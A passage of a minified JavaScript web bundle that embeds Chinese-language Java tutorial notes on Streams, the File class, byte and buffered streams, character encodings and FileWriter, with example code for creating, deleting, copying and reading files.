}\n  ```\n\n  测试类\n\n  ```java\n  public class StreamTest {\n      public static void main(String[] args) {\n          //创建集合\n          ArrayList<String> manList = new ArrayList<String>();\n          manList.add("周润发");\n          manList.add("成龙");\n          manList.add("刘德华");\n          manList.add("吴京");\n          manList.add("周星驰");\n          manList.add("李连杰");\n\n          ArrayList<String> womanList = new ArrayList<String>();\n          womanList.add("林心如");\n          womanList.add("张曼玉");\n          womanList.add("林青霞");\n          womanList.add("柳岩");\n          womanList.add("林志玲");\n          womanList.add("王祖贤");\n    \n          /*\n          //男演员只要名字为3个字的前三人\n          Stream<String> manStream = manList.stream().filter(s -> s.length() == 3).limit(3);\n    \n          //女演员只要姓林的，并且不要第一个\n          Stream<String> womanStream = womanList.stream().filter(s -> s.startsWith("林")).skip(1);\n    \n          //把过滤后的男演员姓名和女演员姓名合并到一起\n          Stream<String> stream = Stream.concat(manStream, womanStream);\n    \n          //把上一步操作后的元素作为构造方法的参数创建演员对象,遍历数据\n  //        stream.map(Actor::new).forEach(System.out::println);\n          stream.map(Actor::new).forEach(p -> System.out.println(p.getName()));\n          */\n    \n          Stream.concat(manList.stream().filter(s -> s.length() == 3).limit(3),\n                  womanList.stream().filter(s -> s.startsWith("林")).skip(1)).map(Actor::new).\n                  forEach(p -> System.out.println(p.getName()));\n      }\n  }\n  ```\n\n\n',wn={data:function(){return{MainComponent1:fn,MainComponent2:_n,MainComponent3:xn}}},En=wn,Tn=Object(u["a"])(En,Sn,yn,!1,null,"1a810af6",null),kn=Tn.exports,Cn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent1}}),t("q-markdown",{attrs:{src:n.MainComponent2}})],1)},jn=[],Mn='## 1.File类\n\n### 1.1File类概述和构造方法【应用】\n\n- File类介绍\n\n  - 它是文件和目录路径名的抽象表示\n  - 文件和目录是可以通过File封装成对象的\n  - 对于File而言,其封装的并不是一个真正存在的文件,仅仅是一个路径名而已.它可以是存在的,也可以是不存在的.将来是要通过具体的操作把这个路径的内容转换为具体存在的\n\n- File类的构造方法\n\n  | 方法名                                 | 说明                               |\n  | ----------------------------------- | -------------------------------- |\n  | File(String   pathname)             | 通过将给定的路径名字符串转换为抽象路径名来创建新的 File实例 |\n  | File(String   parent, String child) | 从父路径名字符串和子路径名字符串创建新的   File实例    |\n  | File(File   parent, String child)   | 从父抽象路径名和子路径名字符串创建新的   File实例     |\n\n- 示例代码\n\n  ```java\n  public class FileDemo01 {\n      public static void main(String[] args) {\n          //File(String pathname): 通过将给定的路径名字符串转换为抽象路径名来创建新的 File实例\n          File f1 = new File("E:\\\\itcast\\\\java.txt");\n          System.out.println(f1);\n\n          //File(String parent, String child): 从父路径名字符串和子路径名字符串创建新的 File实例\n          File f2 = new File("E:\\\\itcast","java.txt");\n          System.out.println(f2);\n\n          //File(File parent, String child): 从父抽象路径名和子路径名字符串创建新的 File实例\n          File f3 = new File("E:\\\\itcast");\n          File f4 = new File(f3,"java.txt");\n          System.out.println(f4);\n      }\n  }\n  ```\n\n### 1.2绝对路径和相对路径【理解】\n\n+ 绝对路径\n\n  是一个完整的路径,从盘符开始\n\n+ 相对路径\n\n  是一个简化的路径,相对当前项目下的路径\n\n+ 示例代码\n\n  ```java\n  public class FileDemo02 {\n      public static void main(String[] args) {\n          // 是一个完整的路径,从盘符开始\n          File file1 = new File("D:\\\\itheima\\\\a.txt");\n\n          // 是一个简化的路径,从当前项目根目录开始\n          File file2 = new File("a.txt");\n          File file3 = new File("模块名\\\\a.txt");\n      }\n  }\n  ```\n\n### 1.3File类创建功能【应用】\n\n- 方法分类\n\n  | 方法名                            | 说明                               |\n  | ------------------------------ | -------------------------------- |\n  | public boolean createNewFile() | 当具有该名称的文件不存在时，创建一个由该抽象路径名命名的新空文件 |\n  | public boolean mkdir()         | 创建由此抽象路径名命名的目录                   |\n  | public boolean mkdirs()        | 创建由此抽象路径名命名的目录，包括任何必需但不存在的父目录    |\n\n- 示例代码\n\n  ```java\n  public class FileDemo02 {\n      public static void main(String[] args) throws IOException {\n          //需求1：我要在E:\\\\itcast目录下创建一个文件java.txt\n          File f1 = new File("E:\\\\itcast\\\\java.txt");\n          System.out.println(f1.createNewFile());\n          System.out.println("--------");\n\n          //需求2：我要在E:\\\\itcast目录下创建一个目录JavaSE\n          File f2 = new File("E:\\\\itcast\\\\JavaSE");\n          System.out.println(f2.mkdir());\n          System.out.println("--------");\n\n          //需求3：我要在E:\\\\itcast目录下创建一个多级目录JavaWEB\\\\HTML\n          File f3 = new File("E:\\\\itcast\\\\JavaWEB\\\\HTML");\n  //        System.out.println(f3.mkdir());\n          System.out.println(f3.mkdirs());\n          System.out.println("--------");\n\n          //需求4：我要在E:\\\\itcast目录下创建一个文件javase.txt\n          File f4 = new File("E:\\\\itcast\\\\javase.txt");\n  //        System.out.println(f4.mkdir());\n          System.out.println(f4.createNewFile());\n      }\n  }\n  ```\n\n### 1.4File类删除功能【应用】\n\n- 方法分类\n\n  | 方法名                       | 说明                |\n  | ------------------------- | ----------------- |\n  | public boolean   delete() | 删除由此抽象路径名表示的文件或目录 |\n\n- 示例代码\n\n  ```java\n  public class FileDemo03 {\n      public static void main(String[] args) throws IOException {\n  //        File f1 = new File("E:\\\\itcast\\\\java.txt");\n          //需求1：在当前模块目录下创建java.txt文件\n          File f1 = new File("myFile\\\\java.txt");\n  //        System.out.println(f1.createNewFile());\n\n          //需求2：删除当前模块目录下的java.txt文件\n          System.out.println(f1.delete());\n          System.out.println("--------");\n\n          //需求3：在当前模块目录下创建itcast目录\n          File f2 = new File("myFile\\\\itcast");\n  //        System.out.println(f2.mkdir());\n\n          //需求4：删除当前模块目录下的itcast目录\n          System.out.println(f2.delete());\n          System.out.println("--------");\n\n          //需求5：在当前模块下创建一个目录itcast,然后在该目录下创建一个文件java.txt\n          File f3 = new File("myFile\\\\itcast");\n  //        System.out.println(f3.mkdir());\n          File f4 = new File("myFile\\\\itcast\\\\java.txt");\n  //        System.out.println(f4.createNewFile());\n\n          //需求6：删除当前模块下的目录itcast\n          System.out.println(f4.delete());\n          System.out.println(f3.delete());\n      }\n  }\n  ```\n\n### 1.5File类判断和获取功能【应用】\n\n- 判断功能\n\n  | 方法名                            | 说明                   |\n  | ------------------------------ | -------------------- |\n  | public   boolean isDirectory() | 测试此抽象路径名表示的File是否为目录 |\n  | public   boolean isFile()      | 测试此抽象路径名表示的File是否为文件 |\n  | public   boolean   exists()    | 测试此抽象路径名表示的File是否存在  |\n\n- 获取功能\n\n  | 方法名                               | 说明                            |\n  | --------------------------------- | ----------------------------- |\n  | public   String getAbsolutePath() | 返回此抽象路径名的绝对路径名字符串             |\n  | public   String getPath()         | 将此抽象路径名转换为路径名字符串              |\n  | public   String getName()         | 返回由此抽象路径名表示的文件或目录的名称          |\n  | public   File[] listFiles()       | 返回此抽象路径名表示的目录中的文件和目录的File对象数组 |\n\n- 示例代码\n\n  ```java\n  public class FileDemo04 {\n      public static void main(String[] args) {\n          //创建一个File对象\n          File f = new File("myFile\\\\java.txt");\n\n  //        public boolean isDirectory()：测试此抽象路径名表示的File是否为目录\n  //        public boolean isFile()：测试此抽象路径名表示的File是否为文件\n  //        public boolean exists()：测试此抽象路径名表示的File是否存在\n          System.out.println(f.isDirectory());\n          System.out.println(f.isFile());\n          System.out.println(f.exists());\n\n  //        public String getAbsolutePath()：返回此抽象路径名的绝对路径名字符串\n  //        public String getPath()：将此抽象路径名转换为路径名字符串\n  //        public String getName()：返回由此抽象路径名表示的文件或目录的名称\n          System.out.println(f.getAbsolutePath());\n          System.out.println(f.getPath());\n          System.out.println(f.getName());\n          System.out.println("--------");\n\n  //        public File[] listFiles()：返回此抽象路径名表示的目录中的文件和目录的File对象数组\n          File f2 = new File("E:\\\\itcast");\n          File[] fileArray = f2.listFiles();\n          for(File file : fileArray) {\n  //            System.out.println(file);\n  //            System.out.println(file.getName());\n              if(file.isFile()) {\n                  System.out.println(file.getName());\n              }\n          }\n      }\n  }\n  ```\n\n### 1.6File类练习一【应用】\n\n+ 案例需求\n\n   在当前模块下的aaa文件夹中创建一个a.txt文件\n\n+ 实现步骤\n\n  + 创建File对象,指向aaa文件夹\n  + 判断aaa文件夹是否存在,如果不存在则创建\n  + 创建File对象,指向aaa文件夹下的a.txt文件\n  + 创建这个文件\n\n+ 代码实现\n\n  ```java\n  public class Test1 {\n      public static void main(String[] args) throws IOException {\n          //练习一：在当前模块下的aaa文件夹中创建一个a.txt文件\n         /* File file = new File("filemodule\\\\aaa\\\\a.txt");\n          file.createNewFile();*/\n          //注意点:文件所在的文件夹必须要存在.\n\n        \t//1.创建File对象,指向aaa文件夹\n          File file = new File("filemodule\\\\aaa");\n        \t//2.判断aaa文件夹是否存在,如果不存在则创建\n          if(!file.exists()){\n              //如果文件夹不存在,就创建出来\n              file.mkdirs();\n          }\n        \t//3.创建File对象,指向aaa文件夹下的a.txt文件\n          File newFile = new File(file,"a.txt");\n        \t//4.创建这个文件\n          newFile.createNewFile();\n      }\n  }\n  ```\n\n### 1.7File类练习二【应用】\n\n+ 案例需求\n\n  删除一个多级文件夹\n\n+ 实现步骤\n\n  + 定义一个方法,接收一个File对象\n  + 遍历这个File对象,获取它下边的每个文件和文件夹对象\n  + 判断当前遍历到的File对象是文件还是文件夹\n  + 如果是文件,直接删除\n  + 如果是文件夹,递归调用自己,将当前遍历到的File对象当做参数传递\n  + 参数传递过来的文件夹File对象已经处理完成,最后直接删除这个空文件夹\n\n+ 代码实现\n\n  ```java\n  public class Test2 {\n      public static void main(String[] args) {\n          //练习二：删除一个多级文件夹\n          //delete方法\n          //只能删除文件和空文件夹.\n          //如果现在要删除一个有内容的文件夹?\n          //先删掉这个文件夹里面所有的内容.\n          //最后再删除这个文件夹\n\n          File src = new File("C:\\\\Users\\\\apple\\\\Desktop\\\\src");\n          deleteDir(src);\n      }\n    \n  \t//1.定义一个方法,接收一个File对象\n      private static void deleteDir(File src) {\n          //先删掉这个文件夹里面所有的内容.\n          //递归 方法在方法体中自己调用自己.\n          //注意: 可以解决所有文件夹和递归相结合的题目\n          //2.遍历这个File对象,获取它下边的每个文件和文件夹对象\n          File[] files = src.listFiles();\n          //3.判断当前遍历到的File对象是文件还是文件夹\n          for (File file : files) {\n              //4.如果是文件,直接删除\n              if(file.isFile()){\n                  file.delete();\n              }else{\n                  //5.如果是文件夹,递归调用自己,将当前遍历到的File对象当做参数传递\n                  deleteDir(file);//参数一定要是src文件夹里面的文件夹File对象\n              }\n          }\n          //6.参数传递过来的文件夹File对象已经处理完成,最后直接删除这个空文件夹\n          src.delete();\n      }\n\n  }\n  ```\n\n### 1.8File类练习三【应用】\n\n+ 案例需求\n\n  统计一个文件夹中每种文件的个数并打印\n\n  打印格式如下：\n\n    \t\t\ttxt:3个\n\n    \t\t\tdoc:4个\n\n    \t\t\tjpg:6个\n\n   \t\t\t …\n\n+ 实现步骤\n\n  + 定义一个方法,参数是HashMap集合用来统计次数和File对象要统计的文件夹\n  + 遍历File对象,获取它下边的每一个文件和文件夹对象\n  + 判断当前File对象是文件还是文件夹\n  + 如果是文件,判断这种类型文件后缀名在HashMap集合中是否出现过\n    + 没出现过,将这种类型文件的后缀名存入集合中,次数存1\n    + 出现过,获取这种类型文件的后缀名出现的次数,对其+1,在存回集合中\n  + 如果是文件夹,递归调用自己,HashMap集合就是参数集合,File对象是当前文件夹对象\n\n+ 代码实现\n\n  ```java\n  public class Test3 {\n      public static void main(String[] args) {\n          //统计一个文件夹中,每种文件出现的次数.\n          //统计 --- 定义一个变量用来统计. ---- 弊端:同时只能统计一种文件\n          //利用map集合进行数据统计,键 --- 文件后缀名  值 ----  次数\n\n          File file = new File("filemodule");\n          HashMap<String, Integer> hm = new HashMap<>();\n          getCount(hm, file);\n          System.out.println(hm);\n      }\n    \n  \t//1.定义一个方法,参数是HashMap集合用来统计次数和File对象要统计的文件夹\n      private static void getCount(HashMap<String, Integer> hm, File file) {\n        \t//2.遍历File对象,获取它下边的每一个文件和文件夹对象\n          File[] files = file.listFiles();\n          for (File f : files) {\n            \t//3.判断当前File对象是文件还是文件夹\n              if(f.isFile()){\n                \t//如果是文件,判断这种类型文件后缀名在HashMap集合中是否出现过\n                  String fileName = f.getName();\n                  String[] fileNameArr = fileName.split("\\\\.");\n                  if(fileNameArr.length == 2){\n                      String fileEndName = fileNameArr[1];\n                      if(hm.containsKey(fileEndName)){\n                          //出现过,获取这种类型文件的后缀名出现的次数,对其+1,在存回集合中\n                          Integer count = hm.get(fileEndName);\n                          //这种文件又出现了一次.\n                          count++;\n                          //把已经出现的次数给覆盖掉.\n                          hm.put(fileEndName,count);\n                      }else{\n                          // 没出现过,将这种类型文件的后缀名存入集合中,次数存1\n                          hm.put(fileEndName,1);\n                      }\n                  }\n              }else{\n                //如果是文件夹,递归调用自己,HashMap集合就是参数集合,File对象是当前文件夹对象代码实现\n                  getCount(hm,f);\n              }\n          }\n      }\n    \n  }\n  ```\n\n## 2.字节流\n\n### 2.1 IO流概述和分类【理解】\n\n- IO流介绍\n  - IO：输入/输出(Input/Output)\n  - 流：是一种抽象概念,是对数据传输的总称.也就是说数据在设备间的传输称为流,流的本质是数据传输\n  - IO流就是用来处理设备间数据传输问题的.常见的应用: 文件复制; 文件上传; 文件下载\n- IO流的分类\n  - 按照数据的流向\n    - 输入流：读数据\n    - 输出流：写数据\n  - 按照数据类型来分\n    - 字节流\n      - 字节输入流\n      - 字节输出流\n    - 字符流\n      - 字符输入流\n      - 字符输出流\n- IO流的使用场景\n  - 如果操作的是纯文本文件,优先使用字符流\n  - 如果操作的是图片、视频、音频等二进制文件,优先使用字节流\n  - 如果不确定文件类型,优先使用字节流.字节流是万能的流\n\n### 2.2字节流写数据【应用】\n\n- 字节流抽象基类\n\n  - InputStream：这个抽象类是表示字节输入流的所有类的超类\n  - OutputStream：这个抽象类是表示字节输出流的所有类的超类\n  - 子类名特点：子类名称都是以其父类名作为子类名的后缀\n\n- 字节输出流\n\n  - FileOutputStream(String name)：创建文件输出流以指定的名称写入文件\n\n- 使用字节输出流写数据的步骤\n\n  - 创建字节输出流对象(调用系统功能创建了文件,创建字节输出流对象,让字节输出流对象指向文件)\n  - 调用字节输出流对象的写数据方法\n  - 释放资源(关闭此文件输出流并释放与此流相关联的任何系统资源)\n\n- 示例代码\n\n  ```java\n  public class FileOutputStreamDemo01 {\n      public static void main(String[] args) throws IOException {\n          //创建字节输出流对象\n        \t/*\n        \t\t注意点:\n        \t\t\t\t1.如果文件不存在,会帮我们创建\n        \t\t\t\t2.如果文件存在,会把文件清空\n        \t*/\n        \t//FileOutputStream(String name)：创建文件输出流以指定的名称写入文件\n          FileOutputStream fos = new FileOutputStream("myByteStream\\\\fos.txt");\n\n          //void write(int b)：将指定的字节写入此文件输出流\n          fos.write(97);\n  //        fos.write(57);\n  //        fos.write(55);\n\n          //最后都要释放资源\n          //void close()：关闭此文件输出流并释放与此流相关联的任何系统资源。\n          fos.close();\n      }\n  }\n  ```\n\n### 2.3字节流写数据的三种方式【应用】\n\n- 写数据的方法分类\n\n  | 方法名                                      | 说明                                       |\n  | ---------------------------------------- | ---------------------------------------- |\n  | void   write(int b)                      | 将指定的字节写入此文件输出流   一次写一个字节数据               |\n  | void   write(byte[] b)                   | 将 b.length字节从指定的字节数组写入此文件输出流   一次写一个字节数组数据 |\n  | void   write(byte[] b, int off, int len) | 将 len字节从指定的字节数组开始，从偏移量off开始写入此文件输出流   一次写一个字节数组的部分数据 |\n\n- 示例代码\n\n  ```java\n  public class FileOutputStreamDemo02 {\n      public static void main(String[] args) throws IOException {\n          //FileOutputStream(String name)：创建文件输出流以指定的名称写入文件\n          FileOutputStream fos = new FileOutputStream("myByteStream\\\\fos.txt");\n          //FileOutputStream(File file)：创建文件输出流以写入由指定的 File对象表示的文件\n  //        FileOutputStream fos = new FileOutputStream(new File("myByteStream\\\\fos.txt"));\n\n          //void write(int b)：将指定的字节写入此文件输出流\n  //        fos.write(97);\n  //        fos.write(98);\n  //        fos.write(99);\n  //        fos.write(100);\n  //        fos.write(101);\n\n  //        void write(byte[] b)：将 b.length字节从指定的字节数组写入此文件输出流\n  //        byte[] bys = {97, 98, 99, 100, 101};\n          //byte[] getBytes()：返回字符串对应的字节数组\n          byte[] bys = "abcde".getBytes();\n  //        fos.write(bys);\n\n          //void write(byte[] b, int off, int len)：将 len字节从指定的字节数组开始，从偏移量off开始写入此文件输出流\n  //        fos.write(bys,0,bys.length);\n          fos.write(bys,1,3);\n\n          //释放资源\n          fos.close();\n      }\n  }\n  ```\n\n### 2.4字节流写数据的两个小问题【应用】\n\n- 字节流写数据如何实现换行\n\n  - windows:\\r\\n\n  - linux:\\n\n  - mac:\\r\n\n- 字节流写数据如何实现追加写入\n\n  - public FileOutputStream(String name,boolean append)\n  - 创建文件输出流以指定的名称写入文件。如果第二个参数为true ，则字节将写入文件的末尾而不是开头\n\n- 示例代码\n\n  ```java\n  public class FileOutputStreamDemo03 {\n      public static void main(String[] args) throws IOException {\n          //创建字节输出流对象\n  //        FileOutputStream fos = new FileOutputStream("myByteStream\\\\fos.txt");\n          FileOutputStream fos = new FileOutputStream("myByteStream\\\\fos.txt",true);\n\n          //写数据\n          for (int i = 0; i < 10; i++) {\n              fos.write("hello".getBytes());\n              fos.write("\\r\\n".getBytes());\n          }\n\n          //释放资源\n          fos.close();\n      }\n  }\n  ```\n\n### 2.5字节流写数据加异常处理【应用】\n\n- 异常处理格式\n\n  - try-catch-finally\n\n    ```java\n    try{\n    \t可能出现异常的代码;\n    }catch(异常类名 变量名){\n    \t异常的处理代码;\n    }finally{\n    \t执行所有清除操作;\n    }\n    ```\n\n  - finally特点\n\n    - 被finally控制的语句一定会执行，除非JVM退出\n\n- 示例代码\n\n  ```java\n  public class FileOutputStreamDemo04 {\n      public static void main(String[] args) {\n          //加入finally来实现释放资源\n          FileOutputStream fos = null;\n          try {\n              fos = new FileOutputStream("myByteStream\\\\fos.txt");\n              fos.write("hello".getBytes());\n          } catch (IOException e) {\n              e.printStackTrace();\n          } finally {\n              if(fos != null) {\n                  try {\n                      fos.close();\n                  } catch (IOException e) {\n                      e.printStackTrace();\n                  }\n              }\n          }\n      }\n  }\n  ```\n\n### 2.6字节流读数据(一次读一个字节数据)【应用】\n\n- 字节输入流\n\n  - FileInputStream(String name)：通过打开与实际文件的连接来创建一个FileInputStream,该文件由文件系统中的路径名name命名\n\n- 字节输入流读取数据的步骤\n\n  - 创建字节输入流对象\n  - 调用字节输入流对象的读数据方法\n  - 释放资源\n\n- 示例代码\n\n  ```java\n  public class FileInputStreamDemo01 {\n      public static void main(String[] args) throws IOException {\n          //创建字节输入流对象\n          //FileInputStream(String name)\n          FileInputStream fis = new FileInputStream("myByteStream\\\\fos.txt");\n\n          int by;\n          /*\n              fis.read()：读数据\n              by=fis.read()：把读取到的数据赋值给by\n              by != -1：判断读取到的数据是否是-1\n           */\n          while ((by=fis.read())!=-1) {\n              System.out.print((char)by);\n          }\n\n          //释放资源\n          fis.close();\n      }\n  }\n  ```\n\n### 2.7字节流复制文件【应用】\n\n- 案例需求\n\n  ​\t把“E:\\\\itcast\\\\窗里窗外.txt”复制到模块目录下的“窗里窗外.txt”   (文件可以是任意文件)\n\n- 实现步骤\n\n  - 复制文本文件，其实就把文本文件的内容从一个文件中读取出来(数据源)，然后写入到另一个文件中(目的地)\n\n  - 数据源：\n\n    ​\tE:\\\\itcast\\\\窗里窗外.txt --- 读数据 --- InputStream --- FileInputStream \n\n  - 目的地：\n\n    ​\tmyByteStream\\\\窗里窗外.txt --- 写数据 --- OutputStream --- FileOutputStream\n\n- 代码实现\n\n  ```java\n  public class CopyTxtDemo {\n      public static void main(String[] args) throws IOException {\n          //根据数据源创建字节输入流对象\n          FileInputStream fis = new FileInputStream("E:\\\\itcast\\\\窗里窗外.txt");\n          //根据目的地创建字节输出流对象\n          FileOutputStream fos = new FileOutputStream("myByteStream\\\\窗里窗外.txt");\n\n          //读写数据，复制文本文件(一次读取一个字节，一次写入一个字节)\n          int by;\n          while ((by=fis.read())!=-1) {\n              fos.write(by);\n          }\n\n          //释放资源\n          fos.close();\n          fis.close();\n      }\n  }\n  ```\n\n### 2.8字节流读数据(一次读一个字节数组数据)【应用】\n\n- 一次读一个字节数组的方法\n\n  - public int read(byte[] b)：从输入流读取最多b.length个字节的数据\n  - 返回的是读入缓冲区的总字节数,也就是实际的读取字节个数\n\n- 示例代码\n\n  ```java\n  public class FileInputStreamDemo02 {\n      public static void main(String[] args) throws IOException {\n          //创建字节输入流对象\n          FileInputStream fis = new FileInputStream("myByteStream\\\\fos.txt");\n\n          byte[] bys = new byte[1024]; //1024及其整数倍\n          int len;\n        \t//循环读取\n          while ((len=fis.read(bys))!=-1) {\n              System.out.print(new String(bys,0,len));\n          }\n\n          //释放资源\n          fis.close();\n      }\n  }\n  ```\n\n### 2.9字节流复制文件【应用】\n\n- 案例需求\n\n  ​\t把“E:\\\\itcast\\\\mn.jpg”复制到模块目录下的“mn.jpg”  (文件可以是任意文件去)\n\n- 实现步骤\n\n  - 根据数据源创建字节输入流对象\n  - 根据目的地创建字节输出流对象\n  - 读写数据，复制图片(一次读取一个字节数组，一次写入一个字节数组)\n  - 释放资源\n\n- 代码实现\n\n  ```java\n  public class CopyJpgDemo {\n      public static void main(String[] args) throws IOException {\n          //根据数据源创建字节输入流对象\n          FileInputStream fis = new FileInputStream("E:\\\\itcast\\\\mn.jpg");\n          //根据目的地创建字节输出流对象\n          FileOutputStream fos = new FileOutputStream("myByteStream\\\\mn.jpg");\n\n          //读写数据，复制图片(一次读取一个字节数组，一次写入一个字节数组)\n          byte[] bys = new byte[1024];\n          int len;\n          while ((len=fis.read(bys))!=-1) {\n              fos.write(bys,0,len);\n          }\n\n          //释放资源\n          fos.close();\n          fis.close();\n      }\n  }\n  ```\n\n## 3.字节缓冲流\n\n### 3.1字节缓冲流构造方法【应用】\n\n- 字节缓冲流介绍\n\n  - lBufferOutputStream：该类实现缓冲输出流.通过设置这样的输出流,应用程序可以向底层输出流写入字节,而不必为写入的每个字节导致底层系统的调用\n  - lBufferedInputStream：创建BufferedInputStream将创建一个内部缓冲区数组.当从流中读取或跳过字节时,内部缓冲区将根据需要从所包含的输入流中重新填充,一次很多字节\n\n- 构造方法：\n\n  | 方法名                                    | 说明          |\n  | -------------------------------------- | ----------- |\n  | BufferedOutputStream(OutputStream out) | 创建字节缓冲输出流对象 |\n  | BufferedInputStream(InputStream in)    | 创建字节缓冲输入流对象 |\n\n- 示例代码\n\n  ```java\n  public class BufferStreamDemo {\n      public static void main(String[] args) throws IOException {\n          //字节缓冲输出流：BufferedOutputStream(OutputStream out)\n   \n          BufferedOutputStream bos = new BufferedOutputStream(new \t\t\t\t                                       FileOutputStream("myByteStream\\\\bos.txt"));\n          //写数据\n          bos.write("hello\\r\\n".getBytes());\n          bos.write("world\\r\\n".getBytes());\n          //释放资源\n          bos.close();\n      \n\n          //字节缓冲输入流：BufferedInputStream(InputStream in)\n          BufferedInputStream bis = new BufferedInputStream(new                                                          FileInputStream("myByteStream\\\\bos.txt"));\n\n          //一次读取一个字节数据\n  //        int by;\n  //        while ((by=bis.read())!=-1) {\n  //            System.out.print((char)by);\n  //        }\n\n          //一次读取一个字节数组数据\n          byte[] bys = new byte[1024];\n          int len;\n          while ((len=bis.read(bys))!=-1) {\n              System.out.print(new String(bys,0,len));\n          }\n\n          //释放资源\n          bis.close();\n      }\n  }\n  ```\n\n### 3.2字节缓冲流复制视频【应用】\n\n- 案例需求\n\n  把“E:\\\\itcast\\\\字节流复制图片.avi”复制到模块目录下的“字节流复制图片.avi”\n\n- 实现步骤\n\n  - 根据数据源创建字节输入流对象\n  - 根据目的地创建字节输出流对象\n  - 读写数据，复制视频\n  - 释放资源\n\n- 代码实现\n\n  ```java\n  public class CopyAviDemo {\n      public static void main(String[] args) throws IOException {\n\n          //复制视频\n  //        method1();\n        \t method2();\n\n      }\n\n      //字节缓冲流一次读写一个字节数组\n      public static void method2() throws IOException {\n          BufferedInputStream bis = new BufferedInputStream(new FileInputStream("E:\\\\itcast\\\\字节流复制图片.avi"));\n          BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream("myByteStream\\\\字节流复制图片.avi"));\n\n          byte[] bys = new byte[1024];\n          int len;\n          while ((len=bis.read(bys))!=-1) {\n              bos.write(bys,0,len);\n          }\n\n          bos.close();\n          bis.close();\n      }\n\n      //字节缓冲流一次读写一个字节\n      public static void method1() throws IOException {\n          BufferedInputStream bis = new BufferedInputStream(new FileInputStream("E:\\\\itcast\\\\字节流复制图片.avi"));\n          BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream("myByteStream\\\\字节流复制图片.avi"));\n\n          int by;\n          while ((by=bis.read())!=-1) {\n              bos.write(by);\n          }\n\n          bos.close();\n          bis.close();\n      }\n\n  }\n  ```\n\n\n\n\n',Rn='## 1.字符流\n\n### 1.1为什么会出现字符流【理解】\n\n- 字符流的介绍\n\n  由于字节流操作中文不是特别的方便，所以Java就提供字符流\n\n  字符流 = 字节流 + 编码表\n\n- 中文的字节存储方式\n\n  用字节流复制文本文件时，文本文件也会有中文，但是没有问题，原因是最终底层操作会自动进行字节拼接成中文，如何识别是中文的呢？\n\n  汉字在存储的时候，无论选择哪种编码存储，第一个字节都是负数\n\n### 1.2编码表【理解】\n\n- 什么是字符集\n\n  是一个系统支持的所有字符的集合，包括各国家文字、标点符号、图形符号、数字等\n\n  l计算机要准确的存储和识别各种字符集符号，就需要进行字符编码，一套字符集必然至少有一套字符编码。常见字符集有ASCII字符集、GBXXX字符集、Unicode字符集等\n\n- 常见的字符集\n\n  - ASCII字符集：\n\n    lASCII：是基于拉丁字母的一套电脑编码系统，用于显示现代英语，主要包括控制字符(回车键、退格、换行键等)和可显示字符(英文大小写字符、阿拉伯数字和西文符号) \n\n    基本的ASCII字符集，使用7位表示一个字符，共128字符。ASCII的扩展字符集使用8位表示一个字符，共256字符，方便支持欧洲常用字符。是一个系统支持的所有字符的集合，包括各国家文字、标点符号、图形符号、数字等\n\n  - GBXXX字符集：\n\n    GBK：最常用的中文码表。是在GB2312标准基础上的扩展规范，使用了双字节编码方案，共收录了21003个汉字，完全兼容GB2312标准，同时支持繁体汉字以及日韩汉字等\n\n  - Unicode字符集：\n\n    UTF-8编码：可以用来表示Unicode标准中任意字符，它是电子邮件、网页及其他存储或传送文字的应用 中，优先采用的编码。互联网工程工作小组（IETF）要求所有互联网协议都必须支持UTF-8编码。它使用一至四个字节为每个字符编码\n\n    编码规则： \n\n      128个US-ASCII字符，只需一个字节编码\n\n      拉丁文等字符，需要二个字节编码\n\n      大部分常用字（含中文），使用三个字节编码\n\n      其他极少使用的Unicode辅助字符，使用四字节编码\n\n### 1.3字符串中的编码解码问题【应用】\n\n- 相关方法\n\n  | 方法名                                      | 说明                          |\n  | ---------------------------------------- | --------------------------- |\n  | byte[] getBytes()                        | 使用平台的默认字符集将该 String编码为一系列字节 |\n  | byte[] getBytes(String charsetName)      | 使用指定的字符集将该 String编码为一系列字节   |\n  | String(byte[] bytes)                     | 使用平台的默认字符集解码指定的字节数组来创建字符串   |\n  | String(byte[] bytes, String charsetName) | 通过指定的字符集解码指定的字节数组来创建字符串     |\n\n- 代码演示\n\n  ```java\n  public class StringDemo {\n      public static void main(String[] args) throws UnsupportedEncodingException {\n          //定义一个字符串\n          String s = "中国";\n\n          //byte[] bys = s.getBytes(); //[-28, -72, -83, -27, -101, -67]\n          //byte[] bys = s.getBytes("UTF-8"); //[-28, -72, -83, -27, -101, -67]\n          byte[] bys = s.getBytes("GBK"); //[-42, -48, -71, -6]\n          System.out.println(Arrays.toString(bys));\n\n          //String ss = new String(bys);\n          //String ss = new String(bys,"UTF-8");\n          String ss = new String(bys,"GBK");\n          System.out.println(ss);\n      }\n  }\n  ```\n\n### 1.4字符流写数据【应用】\n\n- 介绍\n\n  Writer: 用于写入字符流的抽象父类\n\n  FileWriter: 用于写入字符流的常用子类\n\n\n- 构造方法\n\n  | 方法名                                      | 说明                                       |\n  | ---------------------------------------- | ---------------------------------------- |\n  | FileWriter(File file)                    | 根据给定的 File 对象构造一个 FileWriter 对象          |\n  | FileWriter(File file, boolean append)    | 根据给定的 File 对象构造一个 FileWriter 对象          |\n  | FileWriter(String fileName)              | 根据给定的文件名构造一个 FileWriter 对象               |\n  | FileWriter(String fileName, boolean append) | 根据给定的文件名以及指示是否附加写入数据的 boolean 值来构造 FileWriter 对象 |\n\n\n- 成员方法\n\n  | 方法名                                      | 说明         |\n  | ---------------------------------------- | ---------- |\n  | void   write(int c)                      | 写一个字符      |\n  | void   write(char[] cbuf)                | 写入一个字符数组   |\n  | void write(char[] cbuf, int off, int len) | 写入字符数组的一部分 |\n  | void write(String str)                   | 写一个字符串     |\n  | void write(String str, int off, int len) | 写一个字符串的一部分 |\n\n- 刷新和关闭的方法\n\n  | 方法名     | 说明                                 |\n  | ------- | ---------------------------------- |\n  | flush() | 刷新流，之后还可以继续写数据                     |\n  | close() | 关闭流，释放资源，但是在关闭之前会先刷新流。一旦关闭，就不能再写数据 |\n\n- 代码演示\n\n  ```java\n  public class OutputStreamWriterDemo {\n      public static void main(String[] args) throws IOException {\n          FileWriter fw = new FileWriter("myCharStream\\\\a.txt");\n\n          //void write(int c)：写一个字符\n  //        fw.write(97);\n  //        fw.write(98);\n  //        fw.write(99);\n\n          //void writ(char[] cbuf)：写入一个字符数组\n          char[] chs = {\'a\', \'b\', \'c\', \'d\', \'e\'};\n  //        fw.write(chs);\n\n          //void write(char[] cbuf, int off, int len)：写入字符数组的一部分\n  //        fw.write(chs, 0, chs.length);\n  //        fw.write(chs, 1, 3);\n\n          